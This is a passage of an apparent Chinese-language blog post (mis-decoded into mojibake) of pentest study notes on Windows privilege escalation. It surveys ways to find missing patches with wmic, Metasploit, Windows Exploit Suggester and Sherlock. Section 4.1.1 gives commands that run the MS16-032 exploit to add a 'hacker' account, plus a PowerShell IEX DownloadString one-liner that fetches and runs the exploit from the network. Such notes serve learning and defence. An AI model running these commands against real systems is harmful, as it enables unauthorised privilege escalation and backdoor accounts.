<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    
    <title>å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ | RainMaker</title>

    <meta name="description" content="&lt;p&gt;Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;Userã€Administratorã€ Systemã€TrustedInstaller&lt;/code&gt;ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ &lt;code&gt;TrustedInstaller &lt;/code&gt; åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚&lt;/p&gt;">
    <meta name="keywords" content="">

    

    <meta property="og:locale" content="cn" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content= "å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ | RainMaker"  />
    <meta property="og:description" content= "&lt;p&gt;Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;Userã€Administratorã€ Systemã€TrustedInstaller&lt;/code&gt;ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ &lt;code&gt;TrustedInstaller &lt;/code&gt; åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚&lt;/p&gt;" />
    <meta property="og:url" content="http://hasaki-h2.github.io/401ba385.html" />
    <meta property="og:site_name" content="" />
    <meta property="article:author" content="" />
    <meta property="article:publisher" content="" />
    <meta property="og:description" content="&lt;p&gt;Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;Userã€Administratorã€ Systemã€TrustedInstaller&lt;/code&gt;ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ &lt;code&gt;TrustedInstaller &lt;/code&gt; åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚&lt;/p&gt;" />
    <meta name="twitter:title" content="å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ | RainMaker"/>
    <meta name="twitter:description" content="&lt;p&gt;Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;Userã€Administratorã€ Systemã€TrustedInstaller&lt;/code&gt;ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ &lt;code&gt;TrustedInstaller &lt;/code&gt; åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚&lt;/p&gt;"/>
    <script type="application/ld+json">
        {
            "description": "&lt;p&gt;Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯&lt;code&gt;Userã€Administratorã€ Systemã€TrustedInstaller&lt;/code&gt;ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ &lt;code&gt;TrustedInstaller &lt;/code&gt; åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚&lt;/p&gt;",
            "author": { "@type": "Person", "name": "" },
            "@type": "BlogPosting",
            "url": "http://hasaki-h2.github.io/401ba385.html",
            "publisher": {
            "@type": "Organization",
            "logo": {
                "@type": "ImageObject",
                "url": "http://Hasaki-h2.github.io/images/avatar.jpg"
            },
            "name": ""
            },
            "headline": "å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ | RainMaker",
            "datePublished": "2022-01-13T17:58:31.000Z",
            "mainEntityOfPage": {
                "@type": "WebPage",
                "@id": "http://hasaki-h2.github.io/401ba385.html"
            },
            "@context": "http://schema.org"
        }
    </script>




    

    
    <meta property="algolia:search" data-application-id="T8IRMXQO87" data-api-key="614acade121cd1054c73da7b48c66120" data-index-name="test">
    

    

    

    
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ®</text></svg>">
    

    

    

    
<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">


    
<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">


    <script>
        window.isPost = true
        window.aomori = {
            
            
            valine: {
                enable: true,
                appId: "xClBvTvhGrfI2roMnMSLmHUm-gzGzoHsz",
                appKey: "Qi9SH982uKy3x14sNYdKegyJ",
                placeholder: "Hello World!",
                avatar: "",
                pageSize: "10",
                lang: "zh-CN",
                visitor: false,
                highlight: false,
                recordIP: false,
                emojiCDN: "",
                enableQQ: false,
                requiredFields: []
            },
            
            
        }
        window.aomori_logo_typed_animated = true
        window.aomori_search_algolia = true

    </script>

<meta name="generator" content="Hexo 5.4.2"></head>

<body>

    <div class="container">
    <header class="header">
        <div class="header-type">
            
            <div class="header-type-avatar avatar avatar-sm">
                <img src="/images/avatar.jpg" alt="">
            </div>
            
            <div class="header-type-inner">
                
                    <div id="typed-strings" style="display:none">
                        <p>RainMaker</p>
                    </div>
                    <a class="header-type-title" id="typed" href="/"></a>
                
    
                
            </div>
        </div>
        <div class="header-menu">
            <div class="header-menu-inner">
                
                <a href="/">Home</a>
                
                <a href="/archives">Archives</a>
                
                <a href="/friends">Friends</a>
                
            </div>
            <div class="header-menu-social">
                
    <a class="social" target="_blank" href="">
        <ion-icon name=""></ion-icon>
    </a>

    <a class="social" target="_blank" href="">
        <ion-icon name=""></ion-icon>
    </a>

            </div>
        </div>

        <div class="header-menu-mobile">
            <div class="header-menu-mobile-inner" id="mobile-menu-open">
                <i class="icon icon-menu"></i>
            </div>
        </div>
    </header>

    <div class="header-menu-mobile-menu">
        <div class="header-menu-mobile-menu-bg"></div>
        <div class="header-menu-mobile-menu-wrap">
            <div class="header-menu-mobile-menu-inner">
                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
                    <i class="icon icon-cross"></i>
                </div>
                <div class="header-menu-mobile-menu-list">
                    
                    <a href="/">Home</a>
                    
                    <a href="/archives">Archives</a>
                    
                    <a href="/friends">Friends</a>
                    
                </div>
            </div>
        </div>
    </div>

</div>

    <div class="container">
        <div class="main">
            <section class="inner">
                <section class="inner-main">
                    <div class="post">
    <article id="post-ckz2v4t7q007d3o4zbdxjb27h" class="article article-type-post" itemscope
    itemprop="blogPost">

    <div class="article-inner">

        
          
        
        
        

        
        <header class="article-header">
            
  
    <h1 class="article-title" itemprop="name">
      å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡
    </h1>
  

        </header>
        

        <div class="article-more-info article-more-info-post hairline">

            <div class="article-date">
  <time datetime="2022-01-13T17:58:31.000Z" itemprop="datePublished">2022-01-14</time>
</div>

            
            <div class="article-category">
                <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a>
            </div>
            

            
            <div class="article-tag">
                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Priviledge/" rel="tag">Priviledge</a></li></ul>
            </div>
            

            
            <div class="article-busuanzi">
                <span id="busuanzi_value_page_pv">N</span> äººçœ‹è¿‡
            </div>
            

        </div>

        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
            <p>Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯<code>Userã€Administratorã€ Systemã€TrustedInstaller</code>ã€‚åœ¨è¿™å››ç§æƒé™ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ã€‚ç¬¬å››ç§æƒé™ <code>TrustedInstaller </code> åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¼šæ¶‰åŠã€‚</p>
<span id="more"></span>

<ul>
<li><code>User</code>ï¼šæ™®é€šç”¨æˆ·æƒé™ï¼Œæ˜¯ç³»ç»Ÿä¸­æœ€å®‰å…¨çš„æƒé™ï¼ˆå› ä¸ºåˆ†é…ç»™è¯¥ç»„çš„é»˜è®¤æƒé™ä¸å…è®¸æˆå‘˜ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®æˆ–ç”¨æˆ·èµ„æ–™ï¼‰</li>
<li><code>Administrator</code>ï¼šç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥åˆ©ç”¨ Windows çš„æœºåˆ¶å°†è‡ªå·±æå‡ä¸º System æƒé™ï¼Œä»¥ä¾¿æ“ä½œSAMæ–‡ä»¶ç­‰ã€‚</li>
<li><code>System</code>ï¼šç³»ç»Ÿæƒé™ã€‚å¯ä»¥å¯¹SAMç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¾€å¾€éœ€è¦å°† Administrator æƒé™æå‡åˆ°Systemæƒé™æ‰å¯ä»¥å¯¹æ•£åˆ—å€¼è¿›è¡ŒDumpæ“ä½œã€‚</li>
<li><code>TrustedInstaller</code>ï¼šWindows ä¸­çš„æœ€é«˜æƒé™ï¼Œå¯¹ç³»ç»Ÿæ–‡ä»¶ï¼Œå³ä½¿æ‹¥æœ‰Systemæƒé™ä¹Ÿæ— æ³•è¿›è¡Œä¿®æ”¹ã€‚åªæœ‰æ‹¥æœ‰ <code>TrustedInstaller</code> æƒé™çš„ç”¨æˆ·æ‰å¯ä»¥ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶ã€‚</li>
</ul>
<p>Windowsæ“ä½œç³»ç»Ÿä¸­ç®¡ç†å‘˜è´¦å·çš„æƒé™ä»¥åŠLinuxæ“ä½œç³»ç»Ÿä¸­rootè´¦æˆ·çš„æƒé™æ˜¯æ“ä½œç³»ç»Ÿçš„æœ€é«˜æƒé™ã€‚æå‡æƒé™ï¼ˆä¹Ÿç§°ææƒï¼‰çš„æ–¹å¼åˆ†ä¸ºä»¥ä¸‹ä¸¤ç±»ã€‚ </p>
<ul>
<li>çºµå‘ææƒï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ã€‚</li>
</ul>
<p>â€‹       ä¾‹å¦‚ï¼Œä¸€ä¸ª<code>WebShell</code> æƒé™é€šè¿‡ææƒï¼Œæ‹¥æœ‰äº†ç®¡ç†å‘˜æƒé™ï¼Œè¿™ç§ææƒå°±æ˜¯çºµå‘ææƒï¼Œä¹Ÿç§°ä½œæƒé™å‡çº§ ã€‚</p>
<ul>
<li>æ¨ªå‘ææƒï¼šè·å–åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚</li>
</ul>
<p>â€‹       ä¾‹å¦‚ï¼Œåœ¨ç³»ç»ŸAä¸­è·å–äº†ç³»ç»ŸBçš„æƒé™ï¼Œè¿™ç§ææƒå°±å±äºæ¨ªå‘ææƒã€‚å¸¸ç”¨çš„ææƒæ–¹æ³•æœ‰ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒã€æ•°æ®åº“ææƒã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒã€ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒã€webä¸­é—´ä»¶æ¼æ´ææƒã€<code>DLL</code>åŠ«æŒææƒã€æ»¥ç”¨é«˜æƒé™ä»¤ç‰Œææƒã€ç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒç­‰ã€‚</p>
<h2 id="4-1-ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æåŠé˜²èŒƒ"><a href="#4-1-ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æåŠé˜²èŒƒ" class="headerlink" title="4.1 ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æåŠé˜²èŒƒ"></a>4.1 ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æåŠé˜²èŒƒ</h2><p>â€‹        ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒæ˜¯ä¸€ç§é€šç”¨çš„ææƒæ–¹æ³•ï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡ç³»ç»Ÿçš„æ‰€æœ‰å®‰å…¨é™åˆ¶ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®æ˜¯ç›®æ ‡ç³»ç»Ÿæ²¡æœ‰åŠæ—¶å®‰è£…è¡¥ä¸â€”å³ä½¿å¾®è½¯å·²ç»é’ˆå¯¹æŸä¸ªæ¼æ´å‘å¸ƒäº†è¡¥ä¸ï¼Œä½†å¦‚æœç³»ç»Ÿæ²¡æœ‰ç«‹å³å®‰è£…è¡¥ä¸ï¼Œå°±ä¼šè®©æ”»å‡»è€…æœ‰æœºå¯ä¹˜ã€‚ç„¶è€Œï¼Œè¿™ç§ææƒæ–¹æ³•ä¹Ÿå­˜åœ¨ä¸€å®šçš„å±€é™æ€§â€”å¦‚æœç›®æ ‡ç³»ç»Ÿçš„è¡¥ä¸æ›´æ–°å·¥ä½œè¾ƒä¸ºè¿…é€Ÿå’Œå®Œæ•´ï¼Œé‚£ä¹ˆæ”»å‡»è€…è¦æƒ³é€šè¿‡è¿™ç§æ–¹æ³•ææƒï¼Œå°±å¿…é¡»æ‰¾å‡ºç›®æ ‡ç³»ç»Ÿä¸­çš„<code>0day</code>æ¼æ´ã€‚</p>
<h3 id="4-1-1-é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸"><a href="#4-1-1-é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸" class="headerlink" title="4.1.1 é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸"></a>4.1.1 é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸</h3><p>WMICæ˜¯ â€œWmdows Management Instrumentation Command-lineâ€ çš„ç¼©å†™WMICæ˜¯Windows å¹³å°ä¸Šæœ€æœ‰ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ä½¿ç”¨WMICï¼Œä¸ä»…å¯ä»¥ç®¡ç†æœ¬åœ°è®¡ç®—æœºï¼Œè¿˜å¯ä»¥ç®¡ç†åŒä¸€åŸŸå†…çš„æ‰€æœ‰è®¡ç®—æœºï¼ˆéœ€è¦ä¸€å®šçš„æƒé™ï¼‰ï¼Œè€Œä¸”åœ¨è¢«ç®¡ç†çš„è®¡ç®—æœºä¸Šä¸å¿…äº‹å…ˆå®‰è£…WMICã€‚WMICåœ¨ä¿¡æ¯æ”¶é›†å’Œåæ¸—é€æµ‹è¯•é˜¶æ®µæ˜¯éå¸¸å®ç”¨çš„ï¼Œå¯ä»¥è°ƒå–å’ŒæŸ¥çœ‹ç›®æ ‡æœºå™¨çš„è¿›ç¨‹ã€æœ åŠ¡ã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€ç½‘ç»œè¿æ¥ã€ç¡¬ç›˜ä¿¡æ¯ã€ç½‘ç»œå…±äº«ä¿¡æ¯ã€å·²å®‰è£…çš„è¡¥ä¸ã€å¯åŠ¨é¡¹ã€å·²å®‰è£…çš„è½¯ ä»¶ã€æ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯å’Œæ—¶åŒºç­‰ã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#æŸ¥çœ‹å½“å‰æƒé™</span>
whoami /groups 

<span class="hljs-comment">#æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸å®‰è£…ä¿¡æ¯</span>
systeminfo | findstr /C:<span class="hljs-string">&quot;KB&quot;</span> 

<span class="hljs-comment">#é€šè¿‡wmicæŸ¥çœ‹è¡¥ä¸å®‰è£…ä¿¡æ¯</span>
wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>

<p>é€šè¿‡æ‰‹å·¥æŸ¥æ‰¾ç›¸å…³è¡¥ä¸æ˜¯å¦å®‰è£…ç¡®å®šæ˜¯å¦å­˜åœ¨ç›¸å…³æ¼æ´ï¼Œå¹¶åŠ ä»¥åˆ©ç”¨ã€‚ä»¥<code>MS16-032ï¼ˆKB3139914ï¼‰</code>æ¼æ´ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#é¦–å…ˆæŸ¥æ‰¾æ˜¯å¦å®‰è£…è¡¥ä¸ KB3139914</span>
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KB3139914&quot;</span>

<span class="hljs-comment">#åˆ©ç”¨powershellè„šæœ¬ Invoke-MS16-032.ps1ï¼Œæ·»åŠ ç”¨æˆ·ä¸º hackerï¼Œå¯†ç ä¸º abc@123çš„ç”¨æˆ·</span>
<span class="hljs-built_in">Invoke-MS16</span><span class="hljs-literal">-032</span>.ps1 <span class="hljs-literal">-Application</span> cmd.exe <span class="hljs-literal">-Commandline</span> <span class="hljs-string">&quot;/c net user hacker abc@123 /add&quot;</span>

<span class="hljs-comment">#è¿œç¨‹åŠ è½½ï¼Œä¹‹åç»§ç»­æ‰§è¡Œå‘½ä»¤</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;repo1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-MS16</span><span class="hljs-literal">-032</span>.ps1 <span class="hljs-literal">-Application</span> cmd.exe <span class="hljs-literal">-Commandline</span> <span class="hljs-string">&quot;/c net user hacker abc@123 /add&quot;</span></code></pre>

<p>repo1: <a target="_blank" rel="noopener" href="https://github.com/gezginbekir/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1">https://github.com/gezginbekir/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1</a></p>
<h3 id="4-1-2-åˆ©ç”¨Metasploit-å‘ç°ç¼ºå¤±è¡¥ä¸"><a href="#4-1-2-åˆ©ç”¨Metasploit-å‘ç°ç¼ºå¤±è¡¥ä¸" class="headerlink" title="4.1.2 åˆ©ç”¨Metasploit å‘ç°ç¼ºå¤±è¡¥ä¸"></a>4.1.2 åˆ©ç”¨Metasploit å‘ç°ç¼ºå¤±è¡¥ä¸</h3><p>åˆ©ç”¨Metasploitä¸­çš„<code>enum_patches</code>æ¨¡å—ï¼Œå¯ä»¥æ ¹æ®æ¼æ´ç¼–å·å¿«é€Ÿæ‰¾å‡ºç³»ç»Ÿä¸­ç¼ºå°‘çš„è¡¥ä¸ã€‚</p>
<pre><code class="hljs shell">use post/windows/gather/enum_patches</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118003450642.png" alt="image-20220118003450642 "></p>
<h3 id="4-1-3-Windows-Exploit-Suggester"><a href="#4-1-3-Windows-Exploit-Suggester" class="headerlink" title="4.1.3 Windows Exploit Suggester"></a>4.1.3 Windows Exploit Suggester</h3><p>Gotham Digital Security å‘å¸ƒäº†â€”ä¸ªåä¸º <code>Windows Exploit Suggester</code> çš„å·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥å°†ç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„è¡¥ä¸ç¨‹åºä¸å¾®è½¯çš„æ¼æ´æ•°æ®åº“è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å¯ä»¥è¯†åˆ«å¯èƒ½å¯¼è‡´æƒé™æå‡çš„æ¼æ´ï¼Œè€Œå…¶éœ€è¦çš„åªæœ‰ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ã€‚ ä½¿ç”¨<code>systeminfo</code>å‘½ä»¤è·å–å½“å‰ç³»ç»Ÿçš„è¡¥ä¸å®‰è£…æƒ…å†µï¼Œå¹¶å°†è¡¥ä¸ä¿¡æ¯å¯¼å…¥ <code>patches.txt</code> æ–‡ä»¶ã€‚</p>
<p>repo:<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
<p><code>BulletinSearch.xlsx</code>ä¸‹è½½ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982">https://www.microsoft.com/en-gb/download/confirmation.aspx?id=36982</a></p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">å®‰è£…pythonä¾èµ–æŒ‡å®šç‰ˆæœ¬çš„xlrdï¼Œé«˜ç‰ˆæœ¬ä¼šæŠ¥é”™</span>
pip install xlrd==1.2.0
<span class="hljs-meta"></span>
<span class="hljs-meta">#</span><span class="bash">è·Ÿæ–°æ•°æ®åº“ï¼Œæ›´æ–°å¤±è´¥å°±æ‰‹åŠ¨ä¸‹è½½BulletinSearch.xlsxæ–‡ä»¶</span>
python windows-exploit-suggester.py --update
<span class="hljs-meta"></span>
<span class="hljs-meta">#</span><span class="bash">æœé›†windowå¹³å°çš„systeminfoä¿¡æ¯</span>
systeminfo &gt; systeminfo.txt
<span class="hljs-meta"> </span>
<span class="hljs-meta">#</span><span class="bash">æŸ¥è¯¢</span>
python windows-exploit-suggester.py --database BulletinSearch.xlsx --systeminfo systeminfo.txt</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118012525617.png" alt="image-20220118012525617"></p>
<p>çœ‹èµ·æ¥æ•ˆæœè¿˜å¯ä»¥ï¼Œä¸è¿‡<code>BulletinSearch.xlsx</code>åˆ°2017å¹´3æœˆ14æ—¥å°±æ²¡æœ‰äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>bitsadmin</code>çš„<code>Windows Exploit Suggester</code>ä¸‹ä¸€ä»£ç‰ˆæœ¬ï¼Œå¢åŠ äº†å¯¹ Windows 11 ç­‰æ“ä½œç³»ç»Ÿæ¼æ´å’Œè¿‘å¹´æ¥å‘å¸ƒçš„æ¼æ´çš„æ£€æµ‹æ”¯æŒã€‚</p>
<p>repo:<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
<p>ä½¿ç”¨çš„æ˜¯<code>definitions.zip</code>ä½œä¸ºæ•°æ®åº“ï¼Œæ‰‹åŠ¨ä¸‹è½½åœ°å€ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/bitsadmin/wesng/master/definitions.zip">https://raw.githubusercontent.com/bitsadmin/wesng/master/definitions.zip</a></p>
<h3 id="4-1-4-PowerShell-ä¸­çš„-Sherlockè„šæœ¬"><a href="#4-1-4-PowerShell-ä¸­çš„-Sherlockè„šæœ¬" class="headerlink" title="4.1.4 PowerShell ä¸­çš„ Sherlockè„šæœ¬"></a>4.1.4 PowerShell ä¸­çš„ Sherlockè„šæœ¬</h3><p>Sherlock è„šæœ¬å¯ä»¥å¿«é€ŸæŸ¥æ‰¾æœ¬åœ°ç‰¹æƒå‡çº§æ¼æ´ç¼ºå¤±çš„è½¯ä»¶è¡¥ä¸ã€‚</p>
<p>repo: <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>æ”¯æŒçš„æ¼æ´ï¼š</p>
<ul>
<li>MS10-015ï¼šç”¨æˆ·æ¨¡å¼å“é“ƒ (KiTrap0D)</li>
<li>MS10-092ï¼šä»»åŠ¡è®¡åˆ’ç¨‹åº</li>
<li>MS13-053ï¼šNTUserMessageCall Win32k å†…æ ¸æ± æº¢å‡º</li>
<li>MS13-081ï¼šTrackPopupMenuEx Win32k NULL é¡µé¢</li>
<li>MS14-058ï¼šTrackPopupMenu Win32k ç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨</li>
<li>MS15-051ï¼šClientCopyImage Win32k</li>
<li>MS15-078ï¼šå­—ä½“é©±åŠ¨ç¨‹åºç¼“å†²åŒºæº¢å‡º</li>
<li>MS16-016ï¼šâ€œmrxdav.sysâ€WebDAV</li>
<li>MS16-032ï¼šè¾…åŠ©ç™»å½•å¥æŸ„</li>
<li>MS16-034ï¼šWindows å†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åº EoP</li>
<li>MS16-135ï¼šWin32k ç‰¹æƒæå‡</li>
<li>CVE-2017-7199ï¼šNessus Agent 6.6.2 - 6.10.3 Priv Esc</li>
</ul>
<p>ç”¨æ³•ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\Sherlock.ps1
<span class="hljs-comment">#æŸ¥æ‰¾æ‰€æœ‰æ¼æ´</span>
<span class="hljs-built_in">Find-AllVulns</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118015405967.png" alt="image-20220118015405967"></p>
<p>æŸ¥æ‰¾å•ä¸ªæ¼æ´ï¼Œå¦‚æœä¸ä½¿ç”¨CSå¯èƒ½éœ€è¦ä¿®æ”¹è„šæœ¬ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#1</span>
<span class="hljs-built_in">Set-ExploitTable</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span> 
<span class="hljs-comment">#2  å°†æ‰€æœ‰çš„1ä¸‹é¢åŠ ä¸€è¡Œ2å³å¯</span>
<span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$MSBulletin</span> <span class="hljs-variable">$VulnStatus</span>
<span class="hljs-comment">#æŸ¥æ‰¾å•ä¸ªæ¼æ´</span>
<span class="hljs-built_in">Find-MS14058</span></code></pre>

<h3 id="4-1-5-åˆ©ç”¨ä¸€äº›åœ¨çº¿å¹³å°"><a href="#4-1-5-åˆ©ç”¨ä¸€äº›åœ¨çº¿å¹³å°" class="headerlink" title="4.1.5 åˆ©ç”¨ä¸€äº›åœ¨çº¿å¹³å°"></a>4.1.5 åˆ©ç”¨ä¸€äº›åœ¨çº¿å¹³å°</h3><p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p>
<p><a target="_blank" rel="noopener" href="https://detect.secwx.com/">https://detect.secwx.com/</a></p>
<p>ç²˜è´´è¡¥ä¸å·éªŒè¯æ˜¯å¦å­˜åœ¨ç›¸å…³æ¼æ´ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220118120320067.png" alt="image-20220118120320067"></p>
<h2 id="4-2-Windowsæ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"><a href="#4-2-Windowsæ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨" class="headerlink" title="4.2 Windowsæ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"></a>4.2 Windowsæ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨</h2><h3 id="4-2-1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"><a href="#4-2-1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯" class="headerlink" title="4.2.1 ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"></a>4.2.1 ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯</h3><p>Windows ç³»ç»ŸæœåŠ¡æ–‡ä»¶åœ¨æ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½å’Œæ‰§è¡Œï¼Œå¹¶åœ¨åå°è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤ï¼Œå¦‚ 